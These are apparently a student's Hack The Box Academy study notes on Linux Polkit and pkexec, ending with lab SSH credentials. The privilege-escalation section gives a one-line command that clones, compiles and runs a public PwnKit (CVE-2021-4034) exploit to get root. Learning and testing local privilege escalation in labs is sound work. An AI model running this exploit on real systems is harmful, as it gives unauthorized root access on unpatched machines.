# Polkit

> [!info] What is Polkit?
> It is a Linux service that allows user software and system components to communicate with each other if the user software is allowed to communicate as well.
> Custom rules can be placed in /etc/polkit-1/localauthority/50-local.d with the file extension .pkla
> Local authority rules can be used to grant or revoke user and group permissions

## TOC
- [File Groups](file-groups)
- [pkexec pkaction pkcheck](pkexec-pkaction-pkcheck)
- [Privilege Escalation](privilege-escalation)

### File Groups

Polkit works with two file groups:
1 actions/policies located @ 
``` python
(/usr/share/polkit-1/actions)
```
2 rules located @
```python
/usr/share/polkit-1/rules.d
```



### pkexec pkaction pkcheck

`pkexec` - runs a program with the rights of another user or with root rights
`pkaction` - can be used to display actions
`pkcheck` - this can be used to check if a process is authorized for a specific action

Example
```
pkexec -u <user> <command>
pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

###  Privilege Escalation

pkexec memory corruption vulnerability via [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) aka [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

Exploit

```python
git clone https://github.com/arthepsy/CVE-2021-4034.git; cd CVE-2021-4034; gcc cve-2021-4034-poc.c -o poc; ./poc; id
```

## Questions

Username
```python
htb-student
```

Password
```python
HTB_@cademy_stdnt!
```

IP
```python
10.129.205.113
```

SSH
```python
ssh htb-student@10.129.205.113
```
